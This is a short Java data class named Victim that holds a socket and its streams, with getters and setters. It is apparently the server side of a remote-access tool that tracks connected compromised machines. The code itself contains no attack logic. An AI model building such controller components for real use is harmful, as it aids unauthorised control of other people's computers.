package server.model;

import java.io.*;
import java.net.Socket;

public class Victim {

    private String name;
    private Socket socket;
    private InputStream inputStream;
    private OutputStream outputStream;
    private ObjectInputStream objectInputStream;
    private ObjectOutputStream objectOutputStream;
    private DataInputStream dataInputStream;
    private DataOutputStream dataOutputStream;

    //public Victim(Socket socket){ }

    public Victim(String name, Socket socket) throws IOException {
        this.name = name;
        this.socket = socket;
        inputStream = socket.getInputStream();
        outputStream = socket.getOutputStream();
        dataInputStream = new DataInputStream(inputStream);
        dataOutputStream = new DataOutputStream(outputStream);
        //objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
        //ObjectInputStream in = new ObjectInputStream(dataInputStream);
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public Socket getSocket() {
        return socket;
    }

    public void setSocket(Socket socket) {
        this.socket = socket;
    }

    public ObjectInputStream getObjectInputStream() {
        return objectInputStream;
    }

    public void setObjectInputStream(ObjectInputStream objectInputStream) {
        this.objectInputStream = objectInputStream;
    }

    public ObjectOutputStream getObjectOutputStream() {
        return objectOutputStream;
    }

    public void setObjectOutputStream(ObjectOutputStream objectOutputStream) {
        this.objectOutputStream = objectOutputStream;
    }

    public DataInputStream getDataInputStream() {
        return dataInputStream;
    }

    public void setDataInputStream(DataInputStream dataInputStream) {
        this.dataInputStream = dataInputStream;
    }

    public DataOutputStream getDataOutputStream() {
        return dataOutputStream;
    }

    public void setDataOutputStream(DataOutputStream dataOutputStream) {
        this.dataOutputStream = dataOutputStream;
    }
}
